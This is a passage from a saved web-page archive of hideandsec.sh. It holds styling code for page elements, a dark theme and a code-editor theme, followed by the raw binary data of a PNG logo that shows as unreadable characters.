.entity-selector { border: 1px solid rgb(221, 221, 221); border-radius: 3px; overflow: hidden; font-size: 0.8em; }

html.dark-mode .entity-selector { border-color: rgb(17, 17, 17); }

.entity-selector input[type="text"] { width: 100%; display: block; border-radius: 0px; border-width: 0px 0px 1px; border-top-style: initial; border-right-style: initial; border-left-style: initial; border-top-color: initial; border-right-color: initial; border-left-color: initial; border-image: initial; border-bottom-style: solid; border-bottom-color: rgb(221, 221, 221); font-size: 16px; padding: 12px 16px; }

.entity-selector .entity-list { overflow-y: scroll; height: 400px; background-color: rgb(238, 238, 238); margin-inline: 0px; }

html.dark-mode .entity-selector .entity-list { background-color: rgb(34, 34, 34); }

.entity-selector .entity-list-item { background-color: rgb(255, 255, 255); }

html.dark-mode .entity-selector .entity-list-item { background-color: rgb(34, 34, 34); }

.entity-selector .entity-list-item p { margin-bottom: 0px; }

.entity-selector .entity-list-item:focus { outline: 2px dotted var(--color-primary); outline-offset: -4px; }

.entity-selector .entity-list-item.selected { background-color: rgba(0, 0, 0, 0.05); }

html.dark-mode .entity-selector .entity-list-item.selected { background-color: rgba(255, 255, 255, 0.05); }

.entity-selector .loading { height: 400px; padding-top: 24px; }

.entity-selector .entity-selector-add button { margin: 0px; display: block; width: 100%; border-width: 1px 0px 0px; border-right-style: initial; border-bottom-style: initial; border-left-style: initial; border-right-color: initial; border-bottom-color: initial; border-left-color: initial; border-image: initial; border-top-style: solid; border-top-color: rgb(221, 221, 221); }

.entity-selector.compact { font-size: 10px; }

.entity-selector.compact .entity-item-snippet { display: none; }

.scroll-box { max-height: 250px; overflow-y: scroll; border: 1px solid rgb(221, 221, 221); border-radius: 3px; }

.scroll-box .scroll-box-item { padding: 6px 16px; border-bottom: 1px solid rgb(221, 221, 221); border-top: 1px solid rgb(221, 221, 221); margin-top: -1px; }

.scroll-box .scroll-box-item:last-child { border-bottom: 0px; }

.scroll-box[data-instruction]::before { content: attr(data-instruction); padding: 6px 16px; border-bottom: 1px solid rgb(221, 221, 221); display: block; font-size: 0.75rem; color: rgb(102, 102, 102); }

.fullscreen { border: 0px; position: fixed; inset: 0px; width: 100%; height: 100%; z-index: 150; }

.list-sort-container { display: inline-block; }

.list-sort-container form { display: inline-block; }

.list-sort-container .list-sort { display: inline-grid; margin-inline-start: 12px; grid-template-columns: minmax(120px, max-content) 40px; font-size: 0.9rem; border: 2px solid rgb(221, 221, 221); border-radius: 4px; }

html.dark-mode .list-sort-container .list-sort { border-color: rgb(68, 68, 68); }

.list-sort-container .list-sort-label { font-weight: bold; display: inline-block; color: rgb(85, 85, 85); }

html.dark-mode .list-sort-container .list-sort-label { color: rgb(136, 136, 136); }

.list-sort-container .list-sort-type { text-align: start; }

.list-sort-container .list-sort-type, .list-sort-container .list-sort-dir { padding: 6px 12px; cursor: pointer; }

.list-sort-container .list-sort-dir { border-inline-start: 2px solid rgb(221, 221, 221); color: rgb(136, 136, 136); border-color: rgb(221, 221, 221); }

html.dark-mode .list-sort-container .list-sort-dir { border-color: rgb(68, 68, 68); }

.list-sort-container .list-sort-dir .svg-icon { transition: transform 120ms ease-in-out 0s; }

.list-sort-container .list-sort-dir:hover .svg-icon { transform: rotate(180deg); }

table.table .table-user-item { display: grid; grid-template-columns: 42px 1fr; align-items: center; }

table.table .table-entity-item { display: grid; grid-template-columns: 36px 1fr; align-items: center; }
------MultipartBoundary--sKM9b8t92hmyOIGZu7GY7eQCEIcQtcXvFi8Hovc04b----
Content-Type: text/css
Content-Transfer-Encoding: binary
Content-Location: https://hideandsec.sh/dist/print-styles.css?version=v21.08.3

@charset "utf-8";

:root { --color-primary: #206ea7; --color-primary-light: rgba(32,110,167,0.15); --color-page: #206ea7; --color-page-draft: #7e50b1; --color-chapter: #af4d0d; --color-book: #077b70; --color-bookshelf: #a94747; }

header { display: none; }

html, body { font-size: 12px; background-color: rgb(255, 255, 255); }

.page-content { margin: 0px auto; }

.print-hidden { display: none !important; }

.tri-layout-container { grid-template-columns: 1fr; grid-template-areas: "b"; margin-inline: 0px; display: block; }

.card { box-shadow: none; }

.content-wrap.card { padding-inline: 0px; }
------MultipartBoundary--sKM9b8t92hmyOIGZu7GY7eQCEIcQtcXvFi8Hovc04b----
Content-Type: text/css
Content-Transfer-Encoding: binary
Content-Location: https://hideandsec.sh/css/dark-theme.css

@charset "utf-8";

.page-content h1 { text-transform: uppercase; }

h1.break-text { text-transform: uppercase; }

:focus { outline-style: none !important; }

html { background-color: rgb(15, 17, 21); }

html.shaded { background-color: rgb(15, 17, 21); }

.flex.sidebar + .flex.content { background-color: rgb(15, 17, 21); }

.flex.sidebar { background-color: rgb(15, 17, 21); }

body.shaded { background-color: rgb(15, 17, 21); }

.toolbar-container { background-color: rgb(15, 17, 21); }

.search-box input { background-color: rgba(0, 0, 0, 0.2); border: 1px solid rgba(255, 255, 255, 0.3); }

hr { background-color: rgba(0, 0, 0, 0.2); }

.faded-small, .primary-background-light { background-color: rgb(40, 42, 54); }

.floating-toolbox { background-color: rgb(40, 42, 54); }

.editor-toolbar { background-color: rgb(40, 42, 54); border-bottom: 1px solid rgba(0, 0, 0, 0.2); }

.title-input.page-title .input { background-color: rgb(40, 42, 54); }

#markdown-editor .markdown-editor-wrap { background-color: rgb(40, 42, 54); }

.card { background: transparent; box-shadow: none; }

.comment-box { background-color: rgb(51, 54, 68); }

.suggestion-box { background-color: rgb(94, 96, 106); }

.suggestion-box li.active { background-color: rgb(155, 156, 163); }

[notification] { background-color: rgb(29, 31, 38); }

.text-page { color: rgb(139, 233, 253); }

.text-book { color: rgb(80, 250, 123); }

.text-chapter { color: rgb(255, 184, 108); }

.text-primary, p.primary, p .primary, span.primary:hover, .text-primary:hover, .text-button, .text-button:hover, .text-button:focus { color: rgb(248, 248, 242); }

h1, h2, h3, h4, h5, h6 { color: rgb(248, 248, 242); }

h1 { font-weight: 900; }

h2, h3, h4, h5, h6 { font-weight: 700; }

.faded a, .faded button, .faded span, .faded span > div { color: rgb(248, 248, 242); }

.entity-list .page.draft .text-page { color: rgb(189, 147, 249); }

.card .entity-list-item:not(.no-hover):hover { background-color: rgb(68, 71, 90) !important; }

.card .entity-list-item:not(.no-hover):hover .text-muted { color: white !important; }

.entity-list-item:not(.no-hover):hover, .icon-list-item:not(.no-hover):hover { background-color: rgb(68, 71, 90); color: rgb(248, 248, 242) !important; }

.setting-list-label { color: rgb(153, 153, 153); }

.tag-item .tag-value { background-color: rgba(255, 255, 255, 0.1); }

.tag-item a { color: rgb(248, 248, 242); }

.text-small { color: rgb(119, 119, 119) !important; }

[notification="success"] svg { fill: rgb(15, 125, 21) !important; }

.entity-list-item:focus, .icon-list-item:focus { background-color: rgb(68, 71, 90); }

header { border-bottom: 0px; }

#header { background-color: transparent !important; }

.flex.sidebar + .flex.content { border-left: 0px; }

.card h3 { border-bottom: 0px; }

.fake-input, .input-base, input[type="date"], input[type="email"], input[type="number"], input[type="password"], input[type="search"], input[type="text"], input[type="url"], select, textarea { border: 1px solid rgb(68, 71, 90); color: rgb(248, 248, 242); background-color: rgba(0, 0, 0, 0.2); }

.activity-list-item { border-bottom: 1px solid rgba(0, 0, 0, 0.2); }

.floating-toolbox { border: 0px; }

#markdown-editor .markdown-editor-wrap { border: 1px solid rgba(0, 0, 0, 0.2); }

.scrollbar { margin-left: 30px; float: left; height: 300px; width: 65px; background: rgb(245, 245, 245); overflow-y: scroll; margin-bottom: 25px; }

.force-overflow { min-height: 450px; }

#wrapper { text-align: center; width: 500px; margin: auto; }

#style-2::-webkit-scrollbar-track { box-shadow: rgba(0, 0, 0, 0.3) 0px 0px 6px inset; border-radius: 10px; background-color: rgb(245, 245, 245); }

#style-2::-webkit-scrollbar { width: 12px; background-color: rgb(245, 245, 245); }

#style-2::-webkit-scrollbar-thumb { border-radius: 10px; box-shadow: rgba(0, 0, 0, 0.3) 0px 0px 6px inset; background-color: rgb(214, 41, 41); }

.book-tree .sidebar-page-list .page { color: rgb(139, 233, 253) !important; }

.book-tree .sidebar-page-list .chapter { color: rgb(255, 184, 108) !important; }

.book-tree .sidebar-page-list .book { color: rgb(80, 250, 123) !important; }

.input-base.invalid, .input-base.neg, .invalid.fake-input, .neg.fake-input, input.invalid[type="date"], input.invalid[type="email"], input.invalid[type="number"], input.invalid[type="password"], input.invalid[type="search"], input.invalid[type="text"], input.invalid[type="url"], input.neg[type="date"], input.neg[type="email"], input.neg[type="number"], input.neg[type="password"], input.neg[type="search"], input.neg[type="text"], input.neg[type="url"], select.invalid, select.neg, textarea.invalid, textarea.neg { border: 1px solid rgb(255, 85, 85); }

.text-neg, p .neg, p.neg, span.neg { color: rgb(255, 85, 85); }

.dropdown-container ul { background-color: rgb(40, 42, 54); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 2px 0px; border-radius: 1px; border: 1px solid rgb(68, 71, 90); color: rgb(248, 248, 242); }

.dropdown-container ul a, .dropdown-container ul button { color: rgb(248, 248, 242); }

.text-primary, p.primary, p .primary, span.primary:hover, .text-primary:hover, a, a:hover, a:focus, .text-button, .text-button:hover, .text-button:focus { color: rgb(248, 248, 242) !important; fill: rgb(248, 248, 242) !important; }

.dropdown-container ul a:hover { background-color: rgb(68, 71, 90); }

.outline > input:active, .outline > input:focus { border-bottom: 2px solid rgb(139, 233, 253); }

.card.drag-card > div .outline input { background-color: rgb(40, 42, 54); color: rgb(248, 248, 242); }

.card.drag-card .handle { background-color: rgb(40, 42, 54); }

.card.drag-card { border: 1px solid rgb(68, 71, 90); }

.card.drag-card .drag-card-action:hover, .card.drag-card .handle:hover { background-color: rgb(68, 71, 90); }

pre { background-color: rgb(68, 71, 90); border: 1px solid rgb(221, 221, 221); }

pre::after { width: 0px; border-right: 0px; }

.sortable-page-list li { border: 1px solid rgb(98, 114, 164); }

.sortable-page-list, .sortable-page-list ul { background-color: rgb(8, 9, 11); }

.well { background-color: rgb(40, 42, 54); border: 0px; }

.button.outline.page { border-color: rgb(139, 233, 253); color: rgb(139, 233, 253); }

.button.outline.book { border-color: rgb(80, 250, 123); color: rgb(80, 250, 123); }

.featured-image-container { background: none; }

.floating-toolbox .tabs { border-right: 1px solid rgb(68, 71, 90); }

.scroll-box { border: 1px solid rgb(68, 71, 90); }

.scroll-box .scroll-box-item { border-bottom: 1px solid rgb(68, 71, 90); }

::-webkit-scrollbar { width: 10px; }

::-webkit-scrollbar-track { background: rgb(40, 42, 54); }

::-webkit-scrollbar-thumb { background: rgb(68, 71, 90); }

::-webkit-scrollbar-thumb:hover { background: rgb(80, 250, 123); }

.floating-toolbox .tabs svg { fill: rgb(248, 248, 242); }

.entity-selector .entity-list > div { background-color: rgb(40, 42, 54); }

.entity-selector .entity-list { color: rgb(248, 248, 242); background-color: rgb(40, 42, 54); }

#tinymce { background-color: rgb(40, 42, 54) !important; }

.mce-container, .mce-container *, .mce-widget, .mce-widget *, .mce-reset { background-color: rgb(40, 42, 54) !important; }

.mce-menubtn button { color: rgb(248, 248, 242) !important; }

.mce-ico { color: rgb(248, 248, 242) !important; }

.mce-grid-border a:hover, .mce-grid-border a.mce-active { border-color: rgb(139, 233, 253); background: rgb(189, 214, 242); }

.mce-menu-item.mce-selected .mce-text, .mce-menu-item.mce-selected .mce-ico { color: rgb(248, 248, 242) !important; }

.mce-widget, .mce-textbox { color: rgb(255, 255, 255) !important; }

.mce-label { text-shadow: none !important; }

.popup-body { background-color: rgb(40, 42, 54) !important; }

th { background-color: rgb(68, 71, 90); }

.pos .svg-icon { fill: rgb(40, 42, 54); }

ul > li > a { color: rgb(139, 233, 253) !important; }

.page-content > div > a { color: rgb(139, 233, 253) !important; }

@page { size: a4; margin: 0cm !important; }

@media print {
  html, body { width: 210mm; height: 297mm; }
  .entity-list { background-color: rgb(40, 42, 54) !important; }
  .svg-icon { fill: rgb(248, 248, 242) !important; }
  .breadcrumb-listing .breadcrumb-listing-toggle:hover { fill: rgb(248, 248, 242); border-color: transparent; }
  .icon-list.text-primary { fill: rgb(248, 248, 242) !important; }
  #export-menu { color: rgb(248, 248, 242) !important; }
  .book-tree .sidebar-page-list .entity-list-item.selected { background-color: rgb(68, 71, 90); }
  .code-base, code, span.code { border: 1px solid rgb(98, 114, 164); border-radius: 0px; }
  .button.pos, input[type="button"].pos, input[type="submit"].pos { background-color: rgb(80, 250, 123); color: rgb(40, 42, 54); text-transform: uppercase; border: 1px solid rgb(82, 162, 86); vertical-align: top; }
  table.table tr:hover { background-color: rgb(68, 71, 90); }
  table.table tr { border-bottom: 1px solid rgba(0, 0, 0, 0.2); }
  blockquote { border-left: 4px solid rgb(139, 233, 253); background-color: rgb(40, 42, 54) !important; }
  .entity-selector .entity-list-item { background-color: rgb(40, 42, 54); }
  .entity-selector { border: 0px; }
}
------MultipartBoundary--sKM9b8t92hmyOIGZu7GY7eQCEIcQtcXvFi8Hovc04b----
Content-Type: text/css
Content-Transfer-Encoding: binary
Content-Location: https://hideandsec.sh/css/codemirror.css

@charset "utf-8";

.cm-s-moxer.CodeMirror { background-color: rgb(17, 18, 26); color: rgb(182, 192, 228); line-height: 1.8; }

.cm-s-moxer .CodeMirror-gutters { background: rgb(9, 10, 15); color: rgb(53, 57, 75); border: none; }

.cm-s-moxer .CodeMirror-guttermarker, .cm-s-moxer .CodeMirror-guttermarker-subtle, .cm-s-moxer .CodeMirror-linenumber { color: rgb(53, 57, 75); }

.cm-s-moxer .CodeMirror-cursor { border-left: 1px solid rgb(255, 204, 0); }

.cm-s-moxer div.CodeMirror-selected { background: rgba(128, 203, 196, 0.2); }

.cm-s-moxer.CodeMirror-focused div.CodeMirror-selected { background: rgb(33, 36, 49); }

.cm-s-moxer .CodeMirror-line::selection, .cm-s-moxer .CodeMirror-line > span::selection, .cm-s-moxer .CodeMirror-line > span > span::selection { background: rgb(33, 36, 49); }

.cm-s-moxer .CodeMirror-activeline-background, .cm-s-moxer .CodeMirror-activeline-gutter .CodeMirror-linenumber { background: rgba(33, 36, 49, 0.5); }

.cm-s-moxer .cm-keyword { color: rgb(212, 108, 108); }

.cm-s-moxer .cm-operator { color: rgb(212, 108, 108); }

.cm-s-moxer .cm-variable-2 { color: rgb(129, 197, 218); }

.cm-s-moxer .cm-type, .cm-s-moxer .cm-variable-3 { color: rgb(240, 113, 120); }

.cm-s-moxer .cm-builtin { color: rgb(255, 203, 107); }

.cm-s-moxer .cm-atom { color: rgb(169, 155, 226); }

.cm-s-moxer .cm-number { color: rgb(124, 164, 192); }

.cm-s-moxer .cm-def { color: rgb(245, 223, 165); }

.cm-s-moxer .CodeMirror-line .cm-def ~ .cm-def { color: rgb(129, 197, 218); }

.cm-s-moxer .cm-string { color: rgb(178, 228, 174); }

.cm-s-moxer .cm-string-2 { color: rgb(240, 113, 120); }

.cm-s-moxer .cm-comment { color: rgb(99, 100, 106); }

.cm-s-moxer .cm-variable { color: rgb(142, 149, 180); }

.cm-s-moxer .cm-tag { color: rgb(255, 83, 112); }

.cm-s-moxer .cm-meta { color: rgb(255, 203, 107); }

.cm-s-moxer .cm-attribute { color: rgb(199, 146, 234); }

.cm-s-moxer .cm-property { color: rgb(129, 197, 218); }

.cm-s-moxer .cm-qualifier { color: rgb(222, 203, 107); }

.cm-s-moxer .cm-type, .cm-s-moxer .cm-variable-3 { color: rgb(222, 203, 107); }

.cm-s-moxer .cm-error { color: rgb(255, 255, 255); background-color: rgb(255, 83, 112); }

.cm-s-moxer .CodeMirror-matchingbracket { text-decoration: underline; color: rgb(255, 255, 255) !important; }

.CodeMirror-scroll { margin-bottom: -25px; }

.CodeMirror-lines { padding: 7px 5px 5px; }

.CodeMirror-linenumber { margin-left: -7px; }
------MultipartBoundary--sKM9b8t92hmyOIGZu7GY7eQCEIcQtcXvFi8Hovc04b----
Content-Type: image/png
Content-Transfer-Encoding: binary
Content-Location: https://hideandsec.sh/uploads/images/system/2022-09/z4KDmyBtUP2wlHeh-logo-banner-try.png

PNG

   IHDR     V   `   	pHYs    +    IDATx}{%Euop#AQ""
CEhqzx1\&!&#>BQ	!s^A a3g?{{fuwUGZVUuoIec"/V^.o]h/'8=z-se'q//qS6}+/^K{$[2]3)(a`\3(cia''9\bri&9LSsxI.F>KsncFi4) xt-3#Lu]qv^~_k1GmwncNS:'rT:Uf?k^	>8} aw;
Q=*s3diW3mJZq>aw\&-7
nWB7Ynq7>{iw1^jU11== D@AZS4tYDeD Cc*@C*Q&U~TyVa@G{*tphxassS<g8 f<!X?p
V^lI<d`=gk5`}	z#my.ss*^Ol!`X]2;6Xu{@{t2"De>/[rL0c=gV19"~gssFp97s0r/NYa%x9AMbjI6AP@g"3+NQwW|N^.mchWJ>"11KxwW0tixlPW(t0n]iu|ss F*mDAg~JgTIszc{eYAn=uhKU_OYXaf)m2sR>M6J\3$OVeRc%P\3 YbSbc3ilwt&]-`>c*1G-tOrs-$vH+OcaX.QE+^iay<5}o#	)oGrX$8lnG8Ju)[g0fjL5`Y?,rjZ3lX\)[lbkj9OrF[hAkYS}X_S}zye-[RtK9ux5^@LM"H0<J5 cgV=1VU*iQ)WO92Ksf^M*9MNZ^[|x}P[tYbmIl"eAnH	ritZ>N~~hg9i6%-iu$Y&QExOY:/ JiiYk:fr,a6PNzemUZRzr=ee&_CZ_VMGOkiYMOVd$u^4FR|J5@Q\HbyNA=$Sl6[Kcj<NzXi~].gg$"4oXnYOYp-#QyE-SM'V6UXz|c:LYr22B3k,wv Rk~1 NA=?YbW{Z>{`5;CQU
9{YW=[}h=t$nqeDdr_L!/SF99e cKkmC.Y:jZf+bE1hYV"[ W	gV_  CX!UV4q, fs'^c3( Si,o8~	0zib+hvlu4RN	<?@,C;IlfV<fI9:sbzO5^IW{n_K&/[c8b4,=xx]xG?%K!R~\A rhy<Tc`.W=o8w! Y<a<Rr0]wtHH..8i1wTQNW?6:v!6>e<i[	@3q%Dz>LZ\+TPHv473~r@f\#j%dHg  9^`R*;fmqJX9w5=[14Mjk]`TdrU/<lVdA?=g6Y33 xs -xC cwwHi<D>/N;pF@Q&mf"LCeuFI/[NyS+h#<Lkt{<<z826eXkif	F~+he-C!W7.%[l||:Yu7Pb:mp,9F/8]pbUNF':(/Oc(K[2^8PlDWKLs*O$,*+V:S,LseN-q1GOy|$^
bNzJ]OG{Z>=x	9mP-wLjE)jGQ;I+x#[tv&m8665rE3esReA
7erFe\2zmT~;)SR}1wX52Z|t9?5jCY(6PLL<#}T"r+[:YdRN:=W7Zn(;S .NkqrebKNvx	:M($D~DNYXSQFYtO_yL8hN.30rJs\3\im2.<YBMr'Yu&g,nRtq]%h[r<~R^=x7e=yI
bKN>2w}_D+3!5!!2rTT{^ky]'%YN7e1>d^6t.jGc7;D.%5`z { CD> k"JDP80oEX`#|$ [   nb^*9/AqB p!m*BADox- >@D]O:YCA;"z}eD^&0;X=c|(dysY^V3(7 Zxrz>"H:Q<m!\v'V>	;/8 xxB^HlN8M:./L=taXK^ORb&043 "]_33iM1wPHEQ<^=Yk;Bz HQ[rN=fUEQ|W5\a~AD %M?>3_#2/eOxg2'DhK|Y F G"BepOd`*[LDI"r3#3$quZmj+9N!k=!Bf% 3}";TT7BWys6tNLZ~FXZ3i-tN R fe0[dfFD3g,w'z</
 O!3m!7Ul!L3 3crf3Q2bN'B` |BD3-zfZvAn{i\g:%sqPKRWS_KU}|8Y}9gKHHRpskNx21Np32~j2by\k,9	:,X]~''+(|ZIDT;%~g3zH]#w6XW]I'*;fin8FE4u|uuienh#ts$0ycgx{<n-+_3v=i{3:F]:h8t \Bp%ZIFpT _c|U{^=.(?F5~|:e|-U07^Ziyb/tv.-I3e;\xXkEIr _%,1z ^.=gi(wrGDar=f4' N@@9 0}Pm%?}rD<8Y0g]ep9~ti(n~vJiP%n"GN,X<Tf~5J8_lxh8ri~vl=x
f~-fWvE/ t7	W 1b3<6EU >Kf{%N%xW0|h
}WO,m1T|-{!5 ~LD? |0dTN[eZgou`Ey?3a Y\IjxeCqcyEcs&AiK^n\!(59JDW>BX"o!|(%mpEu9t/i 	pf>?,[]8o,jE -"%f(  /SS fDt: `[%hU{G1aMDl'EQloQ:k9M' J(0 08-I:\#y,k1ERViTz#6%7U!]x9u.,TGFz4YDfZNLL^\B2t|"KD[oY4) }#Tw2<F ccuzc-,[*<]MMD7{(WQ:BNL^ c>aHfUvaB P{&{,cXc:Vv^{3:p:Zn`9zy;%\n"<eczGgj>g%&/E*_zAgJ'9"z/#n:cLTKa $3et(#"_-WP.=~TY_>UozI-^f~[ |(w^_'(UM=z! &+yCmw=
v0p^gSp V,*OdCh|n6iGg#[3\r}~6fq	!17MxK[Y
qPNcCY >DxkD=W;Xt(_i23M*Q.T5zDe gV^&%zbO(: "|bILG>d=QkMJs?Mv'3x <jYOE'(vv,x835Xo`'/?5ntluny/fM,Kw8T]P|D^OPgu9xZWH+3QI3%_vezK`y.f&*r'h(Q.8I [/<fF q^*%gnO=ed	7=>=)?'o64zK}7=VDY%'G-.HRo|0qx"Mx W+\-Z';h2jA95\z:@ 2Acat,1DnD	S:B(+CL),spnUz.BHTK|= >o6Vev ZcCEQl8MDrW0GjYV-[[|Lh+vQ7<*sy_/=FP34 2Px<]%QOG!OHUF(09?3|p!f93>YeH|Aw\cbEHr7!p+*N |O{F 'z	g/%q%:4sPm\k=HRf~3- \1FQ}@GQ}fFT~v(\V o[- ngOvlu=5P' }Z7W={m4/C!\}Jf};Cx,k7 lg;\c/yL?uE`m1/oi=/iXZP 03(A[!pmVz;
AzTfy,%zWJ(PE9O[n>&"z/kih^) 4.}zbc?qycmg8Fb<eR5}=Qe}zzj\tn!2[%"R-Io$K6<-WyMP *p$%xTxXJ#Rhk~Gwch3**_KHVtb&iEpJJfwhO
/P~.!OUg2R3/}K#]G33?/MR[M6^4t?)[cmhkq#zn1cN6_k>Oh^/C.8KY@'b5U9E'c%rVc,=Xz+k#e8o[HDu'5/ S^}\txGU[RelE|E'!fDZXOG$ulvQBP9a  DSS%6Mt38lLe n?5CO4]Gk
hs	fV  IDATsj#dY}[;GV7EV$.+*>Sc?{vs0* W4QCzEubhVC
UQ(b=3?:Td\~~A?h8*2V
Res &"4>>5'8Kcoc{!i0-q+XpD1.0"x	:`|OD#w"j@+8U'4^)9<B@>%x60h
"
\~tfVu(GcW$Am!@/T2g<^u*?YAfEj)\DEFt>.NUlN,<PDl)
\39k&'1q"^\!p +FRnK\9?f|?n='dW3bP~&  	[dMK	bFjn"58U@.?@xi7gr 4H17$ePm]D(OYTTx3 (H)ouZ  p%3b2g|313|~oA$	[PD?c	qAX5U(0 M%"[uxx;Cl&<Mx ~m9a/cjG-c3|2
w3RWLL
V}fhU^He% }(Z}'k
%{-\~z2p _\V	XDtU11GGSp~R4s@,+1\`&0h,s1P;, ,"<vavaWa.	4.]J/||iJK8k8u
Vf"7nokEo6EB\Dt]=: |FS:CGXK7[S?*xg<jCyo sR 	F8H<}r5q4i_+=b}.32F>U
Fr&r%)rf}Gdo! g-N4TL;%(H,@DA5DWZ)D 7hDvkR(_t]iW.F:GE|#f"2O!sNv%qe/=O9CBs}<~qk'd9r ``G`Ox^C1F11 ^~'B|w7kbQdpDpB%\GL_[|/3wv=)Zn*~@(D$bePOm<#r"Ph{mg+b=@V@}rnZ@X=z(0z(z<Lb*^UXYf0U(0+}<|9tR|dT2<Z^:8AD:VDSP_;MR" +\,jEK;3:S `Q!poY"sP<Q}A0@D!p9z(%P Y Rksq"O%X T
'j:D!6OTG0UY	0&0qB-5u" 7=b^ET~f~XT3-u]
TZ95[sT~!K	! I=_t"rC,f^h3_ h3MO;y	oP8gl`AWr;!5f~!3_
%v&9TR<h6a`XruZ9Te	>J/P
(8&vVE!{<rgkDF} \-%V .]q8u^ _0c#.uP_: c5aLvJD -^Nrx-[(1,kT|DE4gQ%@VzwUBD[Bp.WA]P:#L":^a*Bjd|&1 tH;Tn$%;De''tvD2h4<Y``$Rt4i(3jZ+k(IGD6 _3Oy&v.=m,j@K`=f_py[<%T~ApU0N%KP0u(u_`
:1b>/#UX":mUFNY`,H31PXb}"G[m?6C|_K4- o~2W[@!D<( "nvn(bg3egeD!e&Lr~Bt#@  ~g"|rO'Beo0X# Dtxq^mouZ=ky9` #c'b'`a#`&;nqAhg;z3fDHq+_m?svhkn2	3UiA*GzTkPe,v`RJ3f":!FD,]iGfHD Z@gdZv|?>o?
? &]w<J;S6 yeRJQ
Z}=W1LU4r8,J<|OVbwpL  <c]+xe|A]ZUpe|"*1OtT6	(HS+/8]g2: |#y^C>iQDt*}iZ.$xm+y @DO%OUCQ,fjE  =FwoX266
d&k;7x.pv?N*-\
CiSl+$fL
# S:[/t{Ka@FzcH,Y3Mc!-key Egz]/k,PGXfl"Y#m\iT9Vc%Wr0n-w&d:[Q=JziV/(n"g8"X6/T^dzlmd<_| JD@6]XZux1naL nx$^{(pspw8e,it}{rg^ ''3@l<:1Cp: 'qLUR6bqeQ2z KY:57 8E:EU>!dIq@DOmmDt'YrWpJ(K9jnl:G[ l*F']+*fEy2D Fy
kTN{ 	V;yl_v",/3oQT;,#]T7c^T	IN'55:VYYj1/^M 
CpMj'<Ovb=1x*NKP`#75 mQ,(opc*^Xetu^uoeE?^$<F\=XKMg%&G:[Dbi\8vdqzXyy8dQ8]p'B7`~XL8SG~#AY63npby9h#czW:8bOnbCtsMR!e@-Zna}:r9sx4=z)>;~2S _LMxFm>om=
$fQwWVZ<d>v)(KO3HX|IS{-hAYNBIes ?zqFj"eEPy=S|=4~l]g4`zjj/ X93S8)1;1O}h\n7p3n8
hP	XE"z4.En!]$g=UQi{4B|._PtS2OW5m)-SZn%LikIVthsnGMVent^PRWv*cC6><F1B{e7=b3A?0pL%Qx0i@OWl 18W 0(h_t<P~3hR)9y5rdCVSn0.r;lS9J{E3 8`f pTgR%8>,6fz]c36gE;6D3H<E|Ghp3@:DLn8]eTI5sgu$c:Ja!|NeCq:Q&$LHsier#fgf|Wk1!T"tqP #
n<qCLC\sshFwr8q>p`z_Bnr&0^2e+
#-'S!hsN^CEq{kL`u"qcG`b6nGBRV2i](aQ^!~2M.E+dyr2>[uY2tj=W^=b{W?Sw mpEw?gib1gr
\0gr_-, iQ@Ng'$W$9(*2huujUaY4FVr
JNZtjr g'6:y{3.JgiR8*yOCc^]45q{ZwYKjzt5cKze{i@;$V.}]#	l2'*)vy4tDStR6rHW{G~
15xcK#kMrOZ:/zrsN}sy[Qx-Z':|:dFyTXJyV\*U'MGpccS|Sa&6RZ.+u6k3Rci\]z'^?kadzvyM`)<h1<T09Z\9YgY OfPSpFLvX{0C/zeIZ5NKB<Ku <w\fW(SVO\L9<x}*XX{.V]t]/^4/yn/KOZZ}<nVYuH4Xi'^!~:M>#,bdrr[''y$xJ&'&xrb{+
~GDLMcx'N&'rf")~VK>+rkW]dhvi@^.I>^19X/^N?_b|Lr&"Yo?pCxd[#{Q~ @g@{&gWVW/iu#$i,RVn_+gk'goVf
'eYM_Gd$9nW=*u$ih9g]Wsr[{h=IIZG*"5_-!SG\':Fzt=.e=du(EzmJY[.359CO |
sot&7D(l.E]1rK"[}[w'!A+ck,l9SrsZ9~]d'Ksn[rDL^W2ua	M5PPg][d"';;]'E;,y]JaZ.Vnbe5m`r9sud'U>x8+Pbi.Jt^!_KWW/KV/Gw@0KunK.R*;LRKuFMR6 !h)F29.F76FSryB`1Zr@/-e*O)Pe$})$/<S:E]%VbZ\|-%/GNwxZ}+o+Xxp9Co[vC1_Eg9cmbbO1++f,-"ii(!5mo0{i<)mcLVdkrx>^h]7<sY:/G?5H1cM8Gj3mSbsWScMO{N@+InY6Y,duF~V]RN.fuXLFiu Y-{[yvnyo/Ysk9l|NzX8K>{}3|9QaY'j<jcoNKN*Wa%etD3{V>v>7E~/7q_cRS57+E3&92x8mZn]3Q+7*^2w=J7.^]Jw#}6Ya7J5&SHz?
l^u:r[5b/'!p;wqe#NRbB    IENDB`
------MultipartBoundary--sKM9b8t92hmyOIGZu7GY7eQCEIcQtcXvFi8Hovc04b------
